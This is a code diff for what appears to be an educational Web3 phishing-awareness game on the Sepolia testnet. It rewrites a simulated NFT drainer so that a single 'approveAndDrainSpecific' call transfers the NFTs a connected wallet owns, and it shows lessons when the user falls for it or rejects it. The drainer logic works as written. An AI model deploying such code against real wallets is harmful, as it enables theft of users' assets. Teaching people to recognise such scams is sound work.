@@ -119,7 +119,7 @@
       "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604", // WGFake
       "0xc4b837Eb523A82F5214d43200af1491B93185979"  // HappyApeYC
     ];
-    const drainerContract = "0xB3BFFC0a351271D5077ffAcf7072eC510Fe890Ff"; // BatchNFTDrainer
+    const drainerContract = "0x627e275324101f3465C47EA51C3F6E04f7CA6F23"; // Replace with BatchNFTDrainerV2 address
     const nftABI = [
       "function setApprovalForAll(address operator, bool approved) external",
       "function balanceOf(address owner) view returns (uint256)",
@@ -127,7 +127,7 @@
       "function name() view returns (string)"
     ];
     const drainerABI = [
-      "function drainSpecific(address[] calldata nftContracts, uint256[][] calldata tokenIds) external"
+      "function approveAndDrainSpecific(address[] calldata nftContracts, uint256[][] calldata tokenIds) external"
     ];
 
     let provider, signer;
@@ -137,7 +137,7 @@
       document.getElementById("failCount").textContent = localStorage.getItem("w3game_failed") || 0;
     }
 
-    // Connects wallet and displays owned NFTs from target collections
+    // Connects wallet and displays owned NFTs
     document.getElementById("connectBtn").onclick = async () => {
       const status = document.getElementById("status");
       status.innerText = "⏳ Connecting...";
@@ -160,14 +160,12 @@
           try {
             await window.ethereum.request({
               method: "wallet_switchEthereumChain",
-              params: [{ chainId: "0xaa36a7" }], // Sepolia chain ID
+              params: [{ chainId: "0xaa36a7" }],
             });
           } catch (switchError) {
-            if (switchError.code === 4902) {
-              status.innerText = "❌ Sepolia Testnet not found. Please add it to MetaMask.";
-            } else {
-              status.innerText = "❌ Failed to switch to Sepolia Testnet.";
-            }
+            status.innerText = switchError.code === 4902
+              ? "❌ Sepolia Testnet not found. Please add it to MetaMask."
+              : "❌ Failed to switch to Sepolia Testnet.";
             console.error("Network switch error:", switchError);
             return;
           }
@@ -192,24 +190,15 @@
       }
     };
 
-    // Approves drainer contract and drains NFTs
+    // Approves and drains NFTs in one transaction
     document.getElementById("drainBtn").onclick = async () => {
       const status = document.getElementById("status");
       if (!signer) return alert("Please connect your wallet first.");
       try {
-        status.innerText = "🚨 Requesting approvals for NFT collections...";
+        status.innerText = "🚨 Approving and draining NFTs...";
         const user = await signer.getAddress();
 
-        // Step 1: Approve drainer contract for each NFT collection
-        for (const contractAddr of nftContracts) {
-          const contract = new ethers.Contract(contractAddr, nftABI, signer);
-          const tx = await contract.setApprovalForAll(drainerContract, true);
-          await tx.wait();
-        }
-
-        status.innerText = "✅ Approvals granted. Draining NFTs...";
-
-        // Step 2: Gather owned token IDs
+        // Gather owned token IDs
         let tokenIdMatrix = [];
         for (const contractAddr of nftContracts) {
           const contract = new ethers.Contract(contractAddr, nftABI, signer);
@@ -226,14 +215,14 @@
           tokenIdMatrix.push(ids);
         }
 
-        // Step 3: Call drainSpecific to transfer NFTs
+        // Call approveAndDrainSpecific
         const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
-        const drainTx = await drainer.drainSpecific(nftContracts, tokenIdMatrix);
-        await drainTx.wait();
+        const tx = await drainer.approveAndDrainSpecific(nftContracts, tokenIdMatrix);
+        await tx.wait();
 
         status.innerText =
           "💀 Drained NFTs from the approved collections!\n\n" +
-          "🧠 Lesson: Phishing sites trick you into signing approvals, letting scammers drain your NFTs. " +
+          "🧠 Lesson: Phishing sites trick you into signing one transaction that approves and drains all your NFTs. " +
           "Always verify contracts before approving!";
         localStorage.setItem("w3game_level2", "drained");
         let failCount = parseInt(localStorage.getItem("w3game_failed") || 0);
@@ -244,7 +233,7 @@
         if (err.code === "ACTION_REJECTED") {
           status.innerText =
             "✅ You survived Level 2!\n\n" +
-            "🛡️ You rejected a malicious approval or drain transaction. " +
+            "🛡️ You rejected a malicious transaction that would have approved and drained your NFTs. " +
             "Always verify contracts before approving!";
           let surviveCount = parseInt(localStorage.getItem("w3game_survived") || 0);
           localStorage.setItem("w3game_survived", surviveCount + 1);
